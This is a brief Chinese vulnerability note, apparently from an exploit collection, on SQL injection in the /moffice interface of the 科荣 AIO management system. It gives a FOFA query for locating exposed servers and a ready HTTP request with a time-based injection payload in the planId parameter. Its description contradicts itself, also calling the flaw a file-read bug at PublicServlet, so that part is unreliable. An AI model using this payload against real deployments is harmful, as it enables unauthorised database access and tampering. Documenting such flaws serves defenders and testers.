# 科荣 AIO 管理系统 moffice接口处存在SQL注入漏洞



### 1.漏洞描述



科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在文件读取漏洞，攻击者可以读取敏感文件。

科荣 AIO 管理系统PublicServlet接口处存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

### 2.fofa语法



```plain
body="changeAccount('8000')"
```

​    

### 3.漏洞复现



```plain
GET /moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/x
```

​    

# ![image-20240925211123210](C:\Users\18484\AppData\Roaming\Typora\typora-user-images\image-20240925211123210.png)
